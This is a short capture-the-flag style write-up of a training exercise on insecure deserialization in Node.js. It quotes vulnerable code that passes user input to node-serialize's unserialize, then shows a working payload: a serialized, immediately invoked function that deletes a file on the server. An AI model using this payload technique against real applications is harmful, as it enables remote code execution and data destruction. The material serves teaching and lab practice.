---
title: "Node remote code execution bug"
layout: page
---

- JavaScript
- Web Security
- Insecure deserialization
- Node.js
- Easy

Writeup by `Sasszem`

# Description and resources
## Mission brief
Even if you have secured your app using all the techniques you've learned so far your possible attackers might still have an ace up their sleeve. Quite literally; this vulnerability is called arbitrary code execution and it is the mother of all vulnerabilities.

With this security problem secrets can be leaked, files can be deleted, identifying information can be sent to our attackers in email and this is just the tip of the iceberg.

## Instructions
Our application just came out of BETA and there is still some leftover code in it that developers used for altering the runtime configuration of the app.
Although this functionality was removed, someone left parts of it in the app.

If you take a look at the extractUser function you might notice that there is a field we deserialize from the user: `customConfig`.

```javascript
export const extractUser = async (req, res, next) => {
    const token = req.session.token;
    let payload;
    let user;
    try {
        payload = await verifyToken(token);
        user = await User.findById(payload.id)
            .lean()
            .exec();
        if (user) {
            serialize.unserialize(user.customConfig);
            // ...
        }
    } catch (e) {
        // ...
    }
    if (user) {
        req.user = user;
    } else {
        req.user = ANON_USER;
    }
    next();
};
```

The problem here is that the library which we're using to perform the deserialization has a feature for serializing and deserializing functions in Javascript objects as well. It will happily accept any serialized functions we throw at it as well.

## Your task
Your task is to delete a file `/srv/important.txt` by exploiting this vulnerability. You can log in as `john@doe.com` with the password `SuperSecret33`.

## Recommended Readings
[Exploiting Node.js deserialization bug](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)

---

# Writeup

Well, it was not hard. After logging in, we can see a "Profile" page where we can set the `customConfig` to any text.

After playing around a bit with the example from the linked article, it was trivial to craft a payload:

```js
var y = {
 rce : function(){
 require('fs').unlinkSync("/srv/important.txt");
 },
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
```

Produced: `{"rce":"_$$ND_FUNC$$_function(){\n require("fs").unlinkSync(\"/srv/important.txt\");\n }"}`

And all I had to do is to add a function call: `{"rce":"_$$ND_FUNC$$_function(){\n require("fs").unlinkSync(\"/srv/important.txt\");\n }()"}`

Set my `customConfig` to this, save, log out and it's done.